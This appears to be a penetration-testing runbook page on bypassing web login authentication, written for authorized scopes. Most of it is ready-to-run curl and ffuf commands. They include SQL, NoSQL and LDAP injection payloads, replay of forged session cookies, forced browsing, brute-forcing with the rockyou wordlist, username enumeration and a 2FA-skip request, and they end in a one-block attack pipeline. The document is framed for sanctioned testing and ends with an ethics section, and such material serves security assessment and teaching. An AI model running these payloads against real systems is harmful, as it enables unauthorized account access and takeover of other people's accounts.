---
title: "Login Bypass"
description: "Bypass authentication with injection, response manipulation, forced browsing, default creds, and logic flaws."
phase: Web
order: 49
tags:
  - auth
  - bypass
  - login
  - logic
tools:
  - curl
  - ffuf
  - burp suite
updated: 2026-10-01
---

A runbook for **login bypass** in an authorized scope. Goal: get an authenticated session without valid credentials by testing injection, client-side trust, forced browsing, defaults, and logic flaws.

## 1. Baseline the happy path

Capture a valid login request and response to understand fields, cookies, and redirects.

```bash
curl -s -i https://target/login -d 'username=test&password=test' | tee baseline.txt
grep -iE 'set-cookie|location|success|token' baseline.txt
```

## 2. Authentication injection

If credentials reach a query or filter, test both fields independently.

```bash
for p in "' OR '1'='1" "admin'-- -" "' OR 1=1-- -" "admin'#" '" OR ""="'; do
  echo "== $p"; curl -s -o /dev/null -w '%{http_code} %{size_download}\n' https://target/login \
    --data-urlencode "username=$p" --data 'password=x'
done
# NoSQL
curl -s -o /dev/null -w '%{http_code}\n' https://target/login \
  -H 'Content-Type: application/json' --data '{"username":{"$ne":null},"password":{"$ne":null}}'
# LDAP
curl -s -o /dev/null -w '%{http_code}\n' https://target/login -d 'username=*)(uid=*))(|(uid=*&password=x'
```

## 3. Response manipulation

If the client decides "logged in" from the response, intercept and edit it. With Burp, change status/body/redirect; here we demonstrate the forged-state idea with a replayed cookie.

```bash
curl -s -i https://target/login -d 'username=test&password=wrong' | grep -iE 'location|success'
# Replay a captured/forged session cookie directly to a protected page
curl -s -o /dev/null -w '%{http_code}\n' https://target/dashboard \
  -H 'Cookie: session=<forged>'
```

## 4. Forced browsing after failure

Request post-auth pages directly; UI gating often hides unprotected endpoints.

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://target/dashboard
ffuf -u https://target/FUZZ -w post-login-paths.txt -fc 401,403,302 -mc all
```

## 5. Default and weak credentials

Try vendor defaults and username variants.

```bash
ffuf -u https://target/login -X POST -d 'username=admin&password=FUZZ' \
  -w /usr/share/wordlists/rockyou.txt -mc 200,302 -fs 1234
for u in admin administrator root user; do
  curl -s -o /dev/null -w "$u %{http_code}\n" https://target/login -d "username=$u&password=admin"
done
```

## 6. Logic flaws

Test enumeration, lockout bypass, 2FA skipping, and forgeable remember-me tokens.

```bash
# Username enumeration via differing responses
for u in admin nosuchuser; do
  curl -s -o /dev/null -w "$u %{http_code} %{size_download}\n" https://target/login -d "username=$u&password=x"
done
# 2FA skip: jump straight to the post-2FA endpoint with a first-factor session
curl -s -o /dev/null -w '%{http_code}\n' https://target/dashboard -H 'Cookie: pre2fa=<session>'
```

## 7. Full pipeline (one block)

```bash
TARGET=https://target
# baseline
curl -s -i "$TARGET/login" -d 'username=test&password=test' | grep -iE 'set-cookie|location|success|token'
# injection sweep
for p in "' OR '1'='1" "admin'-- -" "admin'#"; do
  echo "== $p"; curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$TARGET/login" --data-urlencode "username=$p" --data 'password=x'
done
curl -s -o /dev/null -w 'nosql %{http_code}\n' "$TARGET/login" -H 'Content-Type: application/json' --data '{"username":{"$ne":null},"password":{"$ne":null}}'
curl -s -o /dev/null -w 'ldap %{http_code}\n' "$TARGET/login" -d 'username=*)(uid=*))(|(uid=*&password=x'
# forced browsing
ffuf -u "$TARGET/FUZZ" -w post-login-paths.txt -fc 401,403,302 -mc all
# defaults
for u in admin administrator root; do
  curl -s -o /dev/null -w "$u %{http_code}\n" "$TARGET/login" -d "username=$u&password=admin"
done
# enumeration + 2FA skip
for u in admin nosuchuser; do curl -s -o /dev/null -w "$u %{http_code} %{size_download}\n" "$TARGET/login" -d "username=$u&password=x"; done
curl -s -o /dev/null -w '2fa-skip %{http_code}\n' "$TARGET/dashboard" -H 'Cookie: pre2fa=<session>'
```

## Ethics & legality

- Only test authentication in an official scope or with written authorization.
- Use test accounts; never brute-force real user accounts or cause lockouts.
- Keep the minimal request/response that proves the bypass.
